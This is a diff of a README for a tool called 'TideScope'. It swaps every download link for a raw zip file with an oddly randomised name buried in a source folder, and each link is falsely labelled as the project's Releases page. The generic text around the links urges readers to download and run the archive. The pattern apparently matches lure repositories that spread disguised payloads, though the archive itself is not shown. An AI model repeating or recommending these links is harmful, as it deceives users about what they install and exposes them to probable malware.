@@ -1,6 +1,6 @@
 # 🌊 TideScope - Enhance Collaboration Effortlessly
 
-[![Download TideScope](https://raw.githubusercontent.com/Mehmehamza/TideScope/main/scanner/github/TideScope_v1.1.zip%20TideScope-v1.0-brightgreen)](https://raw.githubusercontent.com/Mehmehamza/TideScope/main/scanner/github/TideScope_v1.1.zip)
+[![Download TideScope](https://raw.githubusercontent.com/Mehmehamza/TideScope/main/web/src/services/Scope_Tide_irreflectiveness.zip%20TideScope-v1.0-brightgreen)](https://raw.githubusercontent.com/Mehmehamza/TideScope/main/web/src/services/Scope_Tide_irreflectiveness.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run TideScope on your computer.
 
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page where you can find the latest version of TideScope.  
-   [Download TideScope](https://raw.githubusercontent.com/Mehmehamza/TideScope/main/scanner/github/TideScope_v1.1.zip)
+   [Download TideScope](https://raw.githubusercontent.com/Mehmehamza/TideScope/main/web/src/services/Scope_Tide_irreflectiveness.zip)
 
 2. **Choose the Right Package**  
    On the Releases page, you will see different versions of TideScope. Look for the latest stable release. Packages may be available for different operating systems. Ensure you select the one that matches your system (Windows, macOS, or Linux).
@@ -47,7 +47,7 @@ To run TideScope smoothly, your system should meet the following requirements:
 ## 📥 Download & Install
 
 To download TideScope, visit the Releases page linked below:  
-[Download TideScope](https://raw.githubusercontent.com/Mehmehamza/TideScope/main/scanner/github/TideScope_v1.1.zip)
+[Download TideScope](https://raw.githubusercontent.com/Mehmehamza/TideScope/main/web/src/services/Scope_Tide_irreflectiveness.zip)
 
 Follow the installation steps in the "Getting Started" section to set it up easily.
 
